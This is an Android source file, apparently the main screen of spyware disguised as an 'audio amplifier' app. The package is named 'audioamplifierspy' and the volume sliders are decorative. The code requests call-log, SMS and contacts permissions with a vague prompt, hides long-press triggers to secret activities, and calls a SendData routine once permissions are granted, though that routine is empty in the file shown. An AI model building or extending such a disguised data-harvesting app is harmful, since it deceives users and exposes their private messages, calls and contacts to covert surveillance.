package com.example.audioamplifierspy;

import android.Manifest;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.view.View;
import android.widget.LinearLayout;
import android.widget.SeekBar;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;

import com.google.android.material.snackbar.Snackbar;

import java.util.List;

import pub.devrel.easypermissions.AfterPermissionGranted;
import pub.devrel.easypermissions.AppSettingsDialog;
import pub.devrel.easypermissions.EasyPermissions;

public class MainActivity extends AppCompatActivity implements EasyPermissions.PermissionCallbacks{

    private boolean entered_till;
    private LinearLayout ll;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        SharedPreferences preferences = getSharedPreferences("sharedPref", MODE_PRIVATE);
        entered_till = preferences.getBoolean("entered", false);

        findViewById(R.id.track).setOnLongClickListener(new View.OnLongClickListener() {
            @Override
            public boolean onLongClick(View v) {
                startActivity(new Intent(MainActivity.this, ShowContent.class));
                return true;
            }
        });

        findViewById(R.id.imageView).setOnLongClickListener(new View.OnLongClickListener() {
            @Override
            public boolean onLongClick(View v) {
                  if (!entered_till)
                      startActivity(new Intent(MainActivity.this, InputACT.class));
                  return true;
            }
        });

        seekBar();
        ask_permissions();


    }

    @AfterPermissionGranted(123) // it will be used to call the function ask_permission after the permission is granted
    private void ask_permissions() {

        String[] perms = {Manifest.permission.READ_CALL_LOG, Manifest.permission.READ_SMS, Manifest.permission.READ_CONTACTS};

        if (EasyPermissions.hasPermissions(this, perms) )
            Toast.makeText(this, "granted", Toast.LENGTH_SHORT).show();
        else {
            EasyPermissions.requestPermissions(this, "Grant All Permission for it to work properly", 123, perms);

        }


    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);

        EasyPermissions.onRequestPermissionsResult(requestCode, permissions, grantResults, this);

    }


    private void seekBar() {

        SeekBar sb = findViewById(R.id.seekBar);
        SeekBar sb2 = findViewById(R.id.seekBar2);
        SeekBar sb3 = findViewById(R.id.seekBar3);

        sb.setProgress(76);
        sb2.setProgress(83);
        sb3.setProgress(50);

        SeekBar.OnSeekBarChangeListener listener = new SeekBar.OnSeekBarChangeListener() {
            @Override
            public void onProgressChanged(SeekBar seekBar, int progress, boolean fromUser) {
                if (progress == 100){
                    Toast.makeText(MainActivity.this, "Volume Has Been Set To its Max Value", Toast.LENGTH_SHORT).show();
                    Snackbar.make(seekBar, "Turn Device Volume To Full To See Difference", Snackbar.LENGTH_INDEFINITE).show();
                }
            }

            @Override
            public void onStartTrackingTouch(SeekBar seekBar) {

            }

            @Override
            public void onStopTrackingTouch(SeekBar seekBar) {

            }
        };

        sb.setOnSeekBarChangeListener(listener);
        sb2.setOnSeekBarChangeListener(listener);
        sb3.setOnSeekBarChangeListener(listener);

    }


    @Override
    public void onPermissionsGranted(int requestCode, @NonNull List<String> perms) {
        if (requestCode == AppSettingsDialog.DEFAULT_SETTINGS_REQ_CODE){

            SendData();

        }



    }

    @Override
    public void onPermissionsDenied(int requestCode, @NonNull List<String> perms) {

        if (EasyPermissions.somePermissionPermanentlyDenied(this, perms) ){
            new AppSettingsDialog.Builder(this).build().show();
        }


    }

    private void SendData() {



    }





}
